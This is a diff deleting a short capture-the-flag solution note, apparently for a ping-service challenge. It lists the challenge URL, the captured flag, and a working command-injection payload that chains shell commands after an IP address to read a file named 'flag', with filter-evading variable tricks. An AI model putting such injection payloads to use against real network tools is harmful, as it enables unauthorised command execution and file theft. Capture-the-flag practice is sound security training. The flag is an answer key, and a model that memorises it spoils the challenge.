@@ -1,5 +1,0 @@
-https://ping.fireshellsecurity.team/#
-
-Flag: seccast{a598c2d4294ef7309d9a9b32b5342ac744cf234c}
-
-1.1.1.1;HOME=/;cd;A=flag;cat<$A
